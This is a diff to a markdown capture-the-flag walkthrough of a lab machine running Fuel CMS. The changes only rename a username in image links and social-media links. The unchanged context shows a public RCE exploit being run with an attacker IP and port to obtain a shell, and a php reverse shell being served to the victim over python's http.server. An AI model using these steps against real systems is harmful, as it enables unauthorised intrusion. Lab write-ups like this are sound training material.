@@ -32,7 +32,7 @@ PORT   STATE SERVICE VERSION
 ```
 
 visiting webpage we got this  
-![image](https://github.com/sudosuraz/sudosuraz.github.io/assets/81553118/28eed893-e321-4f0f-8787-a1c8fee80725)  
+![image](https://github.com/sudosuraj/sudosuraj.github.io/assets/81553118/28eed893-e321-4f0f-8787-a1c8fee80725)  
 
 after google search I found this exploit for this CMS on github : https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated  
 ```@bash
@@ -49,7 +49,7 @@ Terminal 2
 python3 Fuel-Updated.py http://10.10.232.66 10.17.126.99 1338
 ```
 and we got shell access,  
-![image](https://github.com/sudosuraz/sudosuraz.github.io/assets/81553118/360958db-0ead-423e-bea1-51c5345fe08d)  
+![image](https://github.com/sudosuraj/sudosuraj.github.io/assets/81553118/360958db-0ead-423e-bea1-51c5345fe08d)  
 
 To convert it into reverse shell, transfer edited php rev shell into victim machine using python.  
 ```@bash
@@ -57,7 +57,7 @@ php-reverse-shell.php
 python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-![image](https://github.com/sudosuraz/sudosuraz.github.io/assets/81553118/10ae037a-5890-428d-8a06-8d4b04a57e65)
+![image](https://github.com/sudosuraj/sudosuraj.github.io/assets/81553118/10ae037a-5890-428d-8a06-8d4b04a57e65)
 
 Now, take revshell for full shell access!!!
 
@@ -72,9 +72,9 @@ That's it guys, I hope you may find this useful, feel free for suggestion and im
 ##  Be My Friend!
 - [**LinkedIn**](https://www.linkedin.com/in/sudosuraj)
 - [**Instagram**](https://www.instagram.com/sudosuraj)
-- [**Telegram**](https://telegram.me/sudosuraz)
+- [**Telegram**](https://telegram.me/sudosuraj)
 - [**Twitter**](https://twitter.com/sudosuraj)
-- [**Github**](https://github.com/sudosuraz)
+- [**Github**](https://github.com/sudosuraj)
 - [**Hackerone**](https://hackerone.com/init06)
 - [**Bugcrowd**](https://bugcrowd.com/sudosuraj)
 - [**TryHackMe**](https://tryhackme.com/p/0xbug)
